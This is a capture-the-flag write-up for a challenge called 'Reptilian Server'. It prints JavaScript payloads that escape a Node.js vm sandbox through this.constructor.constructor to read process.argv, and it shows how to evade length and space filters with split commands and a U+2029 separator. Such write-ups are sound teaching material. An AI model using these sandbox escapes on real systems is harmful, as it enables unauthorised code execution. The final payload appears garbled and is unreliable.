# Intended Solution to Reptilian Server

The provided hint referencing wanting to know how to start the server is indicative that the flag will be stored in the 
process' command line arguments. In order to access those, you must escape the VM which runs your commands. A google search for "escape node js vm" will reveal many ways this can be done. The payload I used to perform this escape is below:

```javascript
console.log((this.constructor.constructor('return (process.argv)'))())
```

However, to blend in with the Reptilians we need to shorten this payload and remove the spaces from it. 

To shorten the payload, we can break it up into sections by storing parts of the payload in variables, and send it as three separate commands, like so:

```javascript
let b='return (process.argv)'
let a=this.constructor.constructor(b);
console.log(a())
```

That works because the server will see the first command, and its length is less than the maximum command length. Then we can reference the made variable in the next lines.
However, shortening in this manner requires using some spaces. 

In order to write this without any spaces, use a combination of String.fromCharCode and a unicode character "Paragraph Separator" (U+2029) 
to rewrite the payload without spaces, solving the challenge (Note in the below the spaces between 'let' and the variable names are the paragraph separators).

```javascript
let b='return+String.fromCharCode("160")+(process.argv)'
let a=this.constructor.constructor(b);
console.log(a())
```